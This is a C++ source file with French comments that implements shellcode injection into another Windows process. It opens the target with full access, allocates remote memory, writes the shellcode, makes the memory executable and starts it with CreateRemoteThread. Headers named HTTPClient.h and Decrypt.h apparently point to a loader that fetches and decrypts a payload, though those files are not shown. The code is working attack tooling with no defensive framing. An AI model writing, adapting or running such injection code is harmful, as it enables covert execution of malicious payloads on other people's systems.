#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <tchar.h>

#include "Memory.h"  
#include "HTTPClient.h"
#include "Decrypt.h"

// Fonction pour injecter le shellcode dans le processus local
bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
    // Étape 1 : Ouvrir le processus cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) {
        std::cerr << "Erreur : Impossible d'ouvrir le processus cible !" << std::endl;
        return false;
    }
    std::cout << "Processus cible ouvert avec succès." << std::endl;

    // Étape 2 : Allouer de la mémoire dans le processus distant
    LPVOID remoteAddr = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (remoteAddr == NULL) {
        std::cerr << "Erreur : Échec de l'allocation mémoire dans le processus distant !" << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "Mémoire allouée à distance à l'adresse : " << remoteAddr << std::endl;

    // Étape 3 : Écrire le shellcode dans la mémoire allouée
    SIZE_T bytesWritten;
    BOOL success = WriteProcessMemory(
        hProcess,
        remoteAddr,
        shellcode,
        shellcodeSize,
        &bytesWritten
    );
    if (!success || bytesWritten != shellcodeSize) {
        std::cerr << "Erreur : Échec de l'écriture du shellcode dans la mémoire distante !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    else {
        std::cout << "Shellcode écrit avec succès dans la mémoire distante." << std::endl;

    }

    // Étape 4 : Modifier les permissions mémoire pour l'exécution
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Erreur : Échec de VirtualProtectEx pour rendre la mémoire exécutable !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "Permissions changées en PAGE_EXECUTE_READ." << std::endl;


    // Étape 5 : Créer un thread pour exécuter le shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteAddr,
        NULL,
        0,
        NULL
    );
    if (hThread == NULL) {
        std::cerr << "Erreur : Échec de CreateRemoteThread dans le processus distant !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "Thread créé avec succès dans le processus distant." << std::endl;

    
    WaitForSingleObject(hThread, INFINITE);
    std::cout << "Le shellcode a été exécuté dans le processus distant." << std::endl;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}
